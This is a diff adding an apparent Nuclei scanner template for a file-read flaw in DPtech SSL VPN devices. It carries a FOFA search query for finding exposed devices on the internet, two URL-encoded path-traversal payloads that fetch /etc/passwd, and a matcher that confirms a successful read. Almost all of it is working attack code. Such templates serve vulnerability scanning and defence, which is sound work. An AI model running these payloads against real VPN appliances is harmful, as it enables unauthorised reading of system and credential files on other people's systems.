@@ -1,0 +1,25 @@
+id: dp-dptech-vpn-fileread
+
+info: 
+  name: dp-dptech-vpn-fileread
+  author: m0be1
+  severity: high
+  description: 该系统存在文件读取漏洞,攻击者可利用该漏洞获取系统的敏感信息等.
+  
+  reference:
+    - https://
+  metadata: 
+    fofa-query: title=="SSL VPN Service" && header="Dptech" || cert="DPtechCa"
+    verified: true
+    max-request: 1
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd"
+      - "{{BaseURL}}/.%00.%2F.%00.%2F.%00.%2F.%00.%2F.%00.%2F.%00.%2F.%00.%2Fetc%2Fpasswd"
+
+    matchers:
+      - type: dsl
+        dsl:
+          - 'status_code==200 && contains_all(body,"root")'
